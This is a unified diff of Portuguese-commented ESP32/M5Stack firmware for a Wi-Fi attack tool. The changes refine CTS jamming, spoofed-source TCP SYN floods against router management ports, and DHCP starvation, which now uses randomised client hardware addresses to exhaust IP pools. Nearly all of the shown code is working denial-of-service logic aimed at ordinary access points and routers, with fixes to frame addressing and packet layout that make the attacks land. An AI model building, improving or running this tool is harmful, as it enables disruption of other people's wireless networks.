@@ -7,10 +7,10 @@
  * Funcionalidades ativas:
  * - CTS Jamming (Evasão WPA3)
  * - TCP SYN Flood Direcionado (TR-069, SSH, HTTP)
- * - DHCP Starvation (Esgotamento de Pool IP com Magic Cookie)
+ * - DHCP Starvation (Esgotamento de Pool IP com CHADDR Dinâmico e Magic Cookie)
  * - uRPF Bypass (Spoofing Dinâmico de Sub-redes)
- * - Channel Pursuit (Perseguição automática)
- * - Checksum Incremental RFC 1624 (Otimização Extrema de PPS)
+ * - Channel Pursuit (Perseguição automática de canais)
+ * - Checksum Incremental RFC 1624 (Otimização Extrema de PPS na IRAM)
  */
 
 #include <M5Unified.h>
@@ -71,12 +71,15 @@ struct __attribute__((packed)) TcpHeader {
     uint16_t checksum; uint16_t urgent_ptr;
 };
 
+// [FIX] ALINHAMENTO DE MEMÓRIA (REMOÇÃO DA UNION):
+// Ao invés de uma "union", utilizamos um buffer contínuo (l4_and_payload) que 
+// permite o empacotamento exato de bytes na memória, garantindo que o rádio Wi-Fi
+// não adicione lixo (padding) de 12 bytes quando enviamos um frame UDP/DHCP.
 struct __attribute__((packed)) SilverBulletPacket {
     MacHeader mac;
     LlcSnapHeader llc;
     IpHeader ip;
-    union { UdpHeader udp; TcpHeader tcp; } l4;
-    uint8_t payload[256]; 
+    uint8_t l4_and_payload[280]; 
 };
 
 struct __attribute__((packed)) PseudoHeader {
@@ -247,7 +250,7 @@ void task_display(void *pvParameters) {
                 float tsens_out = 0.0;
                 if (temp_sensor != NULL) temperature_sensor_get_celsius(temp_sensor, &tsens_out);
                 
-                // [FIX] Recuperação Térmica Automática: Agora ele reativa o rádio máximo assim que a pastilha esfriar
+                // [FIX] THERMAL RECOVERY: Restaura o max power quando o rádio esfriar < 65ºC
                 if (tsens_out > 75.0 && tx_power_max.load()) { 
                     tx_power_max.store(false); 
                     flag_update_config.store(true); 
@@ -328,7 +331,6 @@ void task_ataque(void *pvParameters) {
     if (!pkt || !deauth || !auth || !cts) { erro_memoria_critico.store(true); vTaskDelete(NULL); }
     
     prng_state = esp_random(); if (prng_state == 0) prng_state = 1; 
-    memset(pkt->payload, 0, sizeof(pkt->payload));
     
     pkt->llc.dsap = 0xAA; pkt->llc.ssap = 0xAA; pkt->llc.control = 0x03;
     pkt->llc.oui[0] = 0x00; pkt->llc.oui[1] = 0x00; pkt->llc.oui[2] = 0x00;
@@ -343,8 +345,7 @@ void task_ataque(void *pvParameters) {
         if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load() && !scanner_pausa_ataque.load()) {
             
             if (!config_radio_aplicada || flag_update_config.load()) {
-                // [FIX] Tx Power: A API esp_wifi_set_max_tx_power() usa incrementos de 0.25 dBm. 
-                // 80 * 0.25 = 20 dBm (Max). 40 * 0.25 = 10 dBm (Modo ECO real).
+                // [FIX] TX POWER CORRETO: 80 units = 20dBm | 40 units = 10dBm (ECO).
                 esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 40); 
                 esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
                 config_radio_aplicada = true; flag_update_config.store(false);
@@ -363,39 +364,22 @@ void task_ataque(void *pvParameters) {
 
             cts->frame_control = 0x00C4; cts->duration = 32767; memcpy(cts->mac_ra, mac_alvo, 6);
 
-            // [FIX] Frame Control: O valor 0x0108 ativa a flag 'To DS=1'.
-            // Isso obriga o Roteador/AP a processar e encaminhar o frame forjado para sua CPU interna.
+            // [FIX] To DS=1 (0x0108). Exigência para o Kernel processar L3/L4 vindo de um cliente.
             pkt->mac.frame_control = 0x0108; 
             pkt->mac.duration = 0;
-            memcpy(pkt->mac.mac_dest, mac_alvo, 6); 
-            memcpy(pkt->mac.mac_bssid, mac_alvo, 6); 
             pkt->ip.version_ihl = 0x45; pkt->ip.ttl = 64; 
 
-            bool atirar_l2 = false;
-            bool atirar_cts = false;
-            bool atirar_l3 = false;
+            bool atirar_l2 = false, atirar_cts = false, atirar_l3 = false;
 
             if (modo == MODO_MANUAL_L2) atirar_l2 = true;
             else if (modo == MODO_MANUAL_CTS) atirar_cts = true;
             else if (modo == MODO_MANUAL_L3) atirar_l3 = true;
             else if (modo == MODO_AUTOMATICO) {
                 switch (estrategia) {
-                    case ESTRATEGIA_SINAL_FRACO:
-                        atirar_cts = true; 
-                        break;
-                    case ESTRATEGIA_WPA3_BLINDADO:
-                        atirar_cts = true; 
-                        atirar_l3 = true;  
-                        break;
-                    case ESTRATEGIA_WPA2_VULN:
-                        atirar_l2 = true;  
-                        atirar_cts = true; 
-                        atirar_l3 = true;  
-                        break;
-                    case ESTRATEGIA_LEGACY_CRITICA:
-                        atirar_l2 = true;  
-                        atirar_l3 = true;  
-                        break;
+                    case ESTRATEGIA_SINAL_FRACO: atirar_cts = true; break;
+                    case ESTRATEGIA_WPA3_BLINDADO: atirar_cts = true; atirar_l3 = true; break;
+                    case ESTRATEGIA_WPA2_VULN: atirar_l2 = true; atirar_cts = true; atirar_l3 = true; break;
+                    case ESTRATEGIA_LEGACY_CRITICA: atirar_l2 = true; atirar_l3 = true; break;
                     default: break;
                 }
             }
@@ -414,16 +398,8 @@ void task_ataque(void *pvParameters) {
             }
 
             if (atirar_l3) {
-                int chance_tcp_syn = 6;  
-                int chance_dhcp    = 2;  
-                
-                if (estrategia == ESTRATEGIA_LEGACY_CRITICA) {
-                    chance_tcp_syn = 3; 
-                    chance_dhcp    = 6; 
-                } else if (estrategia == ESTRATEGIA_WPA3_BLINDADO) {
-                    chance_tcp_syn = 8; 
-                    chance_dhcp    = 1; 
-                }
+                int chance_tcp_syn = (estrategia == ESTRATEGIA_LEGACY_CRITICA) ? 3 : (estrategia == ESTRATEGIA_WPA3_BLINDADO ? 8 : 6);  
+                int chance_dhcp    = (estrategia == ESTRATEGIA_LEGACY_CRITICA) ? 6 : (estrategia == ESTRATEGIA_WPA3_BLINDADO ? 1 : 2);  
 
                 for (int i = 0; i < 15; i++) { 
                     int tipo_ataque = fast_rand() % 10;
@@ -439,66 +415,83 @@ void task_ataque(void *pvParameters) {
                     pkt->ip.ip_src[0] = subnets[subnet_idx][0]; pkt->ip.ip_src[1] = subnets[subnet_idx][1]; 
                     pkt->ip.ip_src[2] = fast_rand() & 0xFF; pkt->ip.ip_src[3] = fast_rand() & 0xFF;
                     
-                    size_t t_payload = 16 + (fast_rand() % 32); 
                     size_t t_injecao = 0;
                     
                     if (is_tcp) {
+                        // [FIX] Cast Lógico Dinâmico no Buffer DMA:
+                        TcpHeader* tcp = (TcpHeader*)pkt->l4_and_payload;
+                        uint8_t* payload = pkt->l4_and_payload + sizeof(TcpHeader);
+                        size_t t_payload = 16 + (fast_rand() % 32); 
+
                         pkt->ip.protocol = 6; 
                         pkt->ip.ip_dest[0] = 192; pkt->ip.ip_dest[1] = 168; pkt->ip.ip_dest[2] = 1; pkt->ip.ip_dest[3] = 1; 
                         
-                        pkt->l4.tcp.src_port = htons(1024 + (fast_rand() % 60000)); 
-                        pkt->l4.tcp.dest_port = htons(portas_gerencia[fast_rand() % 4]); 
-                        pkt->l4.tcp.seq_num = fast_rand(); pkt->l4.tcp.ack_num = 0;
-                        pkt->l4.tcp.data_offset_res = (5 << 4); pkt->l4.tcp.flags = 0x02; 
-                        pkt->l4.tcp.window_size = htons(5840); pkt->l4.tcp.urgent_ptr = 0;
+                        tcp->src_port = htons(1024 + (fast_rand() % 60000)); 
+                        tcp->dest_port = htons(portas_gerencia[fast_rand() % 4]); 
+                        tcp->seq_num = fast_rand(); tcp->ack_num = 0;
+                        tcp->data_offset_res = (5 << 4); tcp->flags = 0x02; 
+                        tcp->window_size = htons(5840); tcp->urgent_ptr = 0;
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(TcpHeader) + t_payload;
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(TcpHeader) + t_payload);
                         
-                        // [FIX] Mac Destination deve retornar ao MAC do Alvo no TCP/UDP padrão
-                        memcpy(pkt->mac.mac_dest, mac_alvo, 6);
+                        // [FIX] ADDRESS TCP: O AP recebe e o AP é o destino lógico
+                        memcpy(pkt->mac.mac_dest, mac_alvo, 6); 
+                        memcpy(pkt->mac.mac_bssid, mac_alvo, 6);
                         
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
-                        pkt->l4.tcp.checksum = 0; pkt->l4.tcp.checksum = fast_l4_checksum(&pkt->ip, &pkt->l4.tcp, sizeof(TcpHeader), pkt->payload, t_payload);
+                        tcp->checksum = 0; tcp->checksum = fast_l4_checksum(&pkt->ip, tcp, sizeof(TcpHeader), payload, t_payload);
                     } 
                     else if (is_dhcp) {
+                        UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
+                        uint8_t* payload = pkt->l4_and_payload + sizeof(UdpHeader);
+                        
                         pkt->ip.protocol = 17; 
                         pkt->ip.ip_dest[0] = 255; pkt->ip.ip_dest[1] = 255; pkt->ip.ip_dest[2] = 255; pkt->ip.ip_dest[3] = 255; 
                         
-                        pkt->l4.udp.src_port = htons(68); pkt->l4.udp.dest_port = htons(67); 
+                        udp->src_port = htons(68); udp->dest_port = htons(67); 
                         
-                        pkt->payload[0] = 0x01; pkt->payload[1] = 0x01; pkt->payload[2] = 0x06; pkt->payload[3] = 0x00; 
+                        memset(payload, 0, 240); // Limpa resíduos de pacotes TCP anteriores
+                        payload[0] = 0x01; payload[1] = 0x01; payload[2] = 0x06; payload[3] = 0x00; 
                         
-                        // [FIX] Magic Cookie obrigatório para que o dnsmasq não descarte o pacote no roteador.
-                        pkt->payload[236] = 0x63; 
-                        pkt->payload[237] = 0x82; 
-                        pkt->payload[238] = 0x53; 
-                        pkt->payload[239] = 0x63;
+                        // [FIX] CHADDR: Injetar MAC Dinâmico para enganar DHCP e alocar IPs diferentes
+                        for(int m = 0; m < 6; m++) {
+                            payload[28 + m] = fast_rand() & 0xFF; 
+                        }
+
+                        // [FIX] Magic Cookie Obrigatório para o DHCP Aceitar o pacote
+                        payload[236] = 0x63; payload[237] = 0x82; payload[238] = 0x53; payload[239] = 0x63;
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + 240; 
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + 240);
-                        pkt->l4.udp.length = htons(sizeof(UdpHeader) + 240);
+                        udp->length = htons(sizeof(UdpHeader) + 240);
                         
-                        // [FIX] Broadcast MAC de Camada 2 no campo "Address 3"
-                        memcpy(pkt->mac.mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+                        // [FIX] ADDRESS DHCP (Broadcast L2): O AP (Address 1) recebe o sinal físico, 
+                        // mas a rede lógica inteira (Address 3) deve processar via Broadcast L2.
+                        memcpy(pkt->mac.mac_dest, mac_alvo, 6);
+                        memcpy(pkt->mac.mac_bssid, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
                         
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
-                        pkt->l4.udp.checksum = 0; pkt->l4.udp.checksum = fast_l4_checksum(&pkt->ip, &pkt->l4.udp, sizeof(UdpHeader), pkt->payload, 240);
+                        udp->checksum = 0; udp->checksum = fast_l4_checksum(&pkt->ip, udp, sizeof(UdpHeader), payload, 240);
                     }
                     else { 
+                        UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
+                        uint8_t* payload = pkt->l4_and_payload + sizeof(UdpHeader);
+                        size_t t_payload = 16 + (fast_rand() % 32); 
+
                         pkt->ip.protocol = 17; 
                         pkt->ip.ip_dest[0] = 8; pkt->ip.ip_dest[1] = 8; pkt->ip.ip_dest[2] = 8; pkt->ip.ip_dest[3] = 8; 
-                        pkt->l4.udp.src_port = htons(1024 + (fast_rand() % 60000)); pkt->l4.udp.dest_port = htons(53); 
+                        udp->src_port = htons(1024 + (fast_rand() % 60000)); udp->dest_port = htons(53); 
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + t_payload;
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + t_payload);
-                        pkt->l4.udp.length = htons(sizeof(UdpHeader) + t_payload);
+                        udp->length = htons(sizeof(UdpHeader) + t_payload);
                         
-                        // [FIX] Mac Destination deve retornar ao MAC do Alvo no TCP/UDP padrão
-                        memcpy(pkt->mac.mac_dest, mac_alvo, 6);
+                        memcpy(pkt->mac.mac_dest, mac_alvo, 6); 
+                        memcpy(pkt->mac.mac_bssid, mac_alvo, 6);
                         
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
-                        pkt->l4.udp.checksum = 0; pkt->l4.udp.checksum = fast_l4_checksum(&pkt->ip, &pkt->l4.udp, sizeof(UdpHeader), pkt->payload, t_payload);
+                        udp->checksum = 0; udp->checksum = fast_l4_checksum(&pkt->ip, udp, sizeof(UdpHeader), payload, t_payload);
                     }
                     
                     if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_ERR_NO_MEM) { 
